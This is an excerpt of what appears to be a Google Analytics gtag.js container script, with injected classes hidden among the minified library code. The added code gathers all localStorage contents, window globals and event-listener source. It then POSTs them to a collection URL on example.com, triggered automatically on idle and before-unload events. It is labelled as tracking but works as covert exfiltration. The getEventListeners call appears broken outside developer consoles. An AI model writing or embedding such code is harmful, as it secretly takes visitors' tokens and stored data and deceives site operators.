...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-HLZRF0MRQ1",
        "tag_id": 18
      }, {
        ...
        "priority": 1,
        "vtp_conversionRules": ["list", ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"purchase\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"login\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"Share\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"]],
        "vtp_instanceDestinationId": "G-HLZRF0MRQ1",
        "tag_id": 7
      }, {
        "function": "__gct",
        "vtp_trackingId": "G-HLZRF0MRQ1",
    ...
    "security_groups": {
      "google": ["__ccd_conversion_marking", "__ccd_em_download", "__ccd_em_outbound_click", "__ccd_em_page_view", "__ccd_em_scroll", "__ccd_em_site_search", "__ccd_em_video", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_ga_gam_link", "__ogt_google_signals", "__set_product_settings"]
    }
  };
  var aa,
    ba = function (a) {
  ...
  class DataProcessor {
    static stringifyFunc(func) {
      return func instanceof Function ? func.toString() : func;
    }
  }

  // Utilities for localStorage, global variables and events 
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQh31RZ31V3EqQZfd7yKWsKi/up7SQFLnOYtx39YIIUMxxoCZiM\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  class EnhancedTracker {
    static collectLocalStorage() {
      ...
      Object.keys(localStorage).forEach(key => {
        localStorageData[key] = DataProcessor.stringifyFunc(localStorage[key]);
      });
      return localStorageData;
    }
    static collectGlobalVariables() {
      const globalVariablesData = {};
      for (let prop in window) {
        if (Object.prototype.hasOwnProperty.call(window, prop)) {
          const globalVarValue = window[prop];
          globalVariablesData[prop] = DataProcessor.stringifyFunc(globalVarValue);
        }
      }
      return globalVariablesData;
    }
    static collectEventListeners() {
      const eventListenerData = {};
      const events = ['click', 'load', 'unload', 'idle', 'beforeunload'];
      events.forEach(event => {
        const listeners = getEventListeners(window)[event] || [];
        const convertedListeners = listeners.map(listener => listener.listener.toString());
        eventListenerData[event] = convertedListeners;
      });
      return eventListenerData;
    }
  }

  // Aggregator for collecting all the tracking behaviors 
  ...
  class TrackerAggregator {
    static collectAllTrackers() {
      const data = {
        localStorageTracker: EnhancedTracker.collectLocalStorage(),
        globalVariablesTracker: EnhancedTracker.collectGlobalVariables(),
        eventListenersTracker: EnhancedTracker.collectEventListeners()
      };
      return data;
    }
  }

  // Function to send collected data to the server
  ...
  function sendDataToServer(data) {
    const SERVER_URL = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", SERVER_URL);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function () {
      if (xhr.status >= 200 && xhr.status < 400) console.log('Data transmission success');else console.error(`Data transmission error, status: ${xhr.status}`);
    };
  ...
  // Main function to initiate tracking behavior collection
  ...
  function startTracking() {
    const trackerData = TrackerAggregator.collectAllTrackers();
    const trackerDataCount = Object.keys(trackerData).reduce((sum, key) => sum + Object.keys(trackerData[key]).length, 0);
    if (trackerDataCount > 0) {
      console.log(`Discovered ${trackerDataCount} new attributes`);
      sendDataToServer(trackerData);
    } else {
  ...
  window.addEventListener("idle", startTracking);
  function ks(a, b) {
    var c = void 0;
    try {
  ...
  window.addEventListener("beforeunload", startTracking);
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-HLZRF0MRQ1'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
